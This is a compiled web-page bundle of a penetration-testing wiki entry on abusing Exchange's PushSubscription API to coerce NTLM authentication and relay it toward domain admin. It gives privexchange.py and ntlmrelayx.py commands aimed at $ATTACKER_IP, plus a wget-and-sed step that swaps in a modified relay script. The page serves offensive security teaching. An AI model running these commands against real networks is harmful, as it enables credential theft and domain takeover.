import{_ as s,c as i,a5 as e,o as t}from"./chunks/framework.B5CpDqM0.js";const k=JSON.parse('{"title":"PushSubscription abuse","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/movement/mitm-and-coerced-authentications/pushsubscription-abuse.md","filePath":"ad/movement/mitm-and-coerced-authentications/pushsubscription-abuse.md","lastUpdated":1724982529000}'),n={name:"ad/movement/mitm-and-coerced-authentications/pushsubscription-abuse.md"};function h(r,a,l,p,o,c){return t(),i("div",null,a[0]||(a[0]=[e(`<h1 id="pushsubscription-abuse" tabindex="-1">PushSubscription abuse <a class="header-anchor" href="#pushsubscription-abuse" aria-label="Permalink to &quot;PushSubscription abuse&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>&quot;PushSubscription&quot; is an API on Exchange Web Services that allows to subscribe to push notifications. Attackers abuse it to make Exchange servers authenticate to a target of their choosing. The coerced authentication is made over HTTP, which is particularly powerful when doing <a href="./../ntlm/relay">NTLM relay</a> (<a href="./../ntlm/relay#mic-message-integrity-code">because of the Session Signing and MIC mitigations</a>). As Exchange servers usually have high privileges in a domain (i.e. <code>WriteDacl</code>, see <a href="./../dacl/">Abusing ACLs</a>), the forced authentication can then be relayed and abused to obtain domain admin privileges (see <a href="./../ntlm/relay">NTLM Relay</a> and <a href="./../kerberos/delegations/#unconstrained-delegations-kud">Kerberos Unconstrained Delegations</a>).</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p><a href="https://github.com/dirkjanm/privexchange/" target="_blank" rel="noreferrer">PrivExchange</a> (Python) is a tool able to log in on Exchange Web Services and call that API.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">privexchange.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $DOMAIN </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;$DOMAIN_USER&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;$PASSWORD&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -ah</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ATTACKER_IP $EXCHANGE_SERVER_TARGET</span></span></code></pre></div><div class="tip custom-block"><p>In the situation where the tester doesn&#39;t have any credentials, it is still possible to <a href="./../ntlm/relay">relay an authentication</a> to make the API call.</p><p>The modified <a href="https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py" target="_blank" rel="noreferrer">httpattack.py</a> can be used with ntlmrelayx.py to perform this attack. The attacker host needs to be modified in the script since it is hard-coded.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /PATH/TO/impacket/impacket/examples/ntlmrelayx/attacks/httpattack.py</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">mv</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> httpattack.py</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> httpattack.py.old</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">wget</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/httpattack.py</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sed</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;s/attacker_url = .*$/attacker_url = &quot;$ATTACKER_URL&quot;/&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> httpattack.py</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /PATH/TO/impacket</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">pip3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> .</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ntlmrelayx.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://exchange.server.EWS/Exchange.asmx</span></span></code></pre></div></div><div class="note custom-block"><p>On February 12th 2019, Microsoft released updates for Exchange which resolved</p><ul><li>the coerced authentication issue</li><li>the fact that Exchange servers had overkill permissions leading attacker to a full domain compromission.</li></ul></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" target="_blank" rel="noreferrer">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</a></p>`,10)]))}const u=s(n,[["render",h]]);export{k as __pageData,u as default};
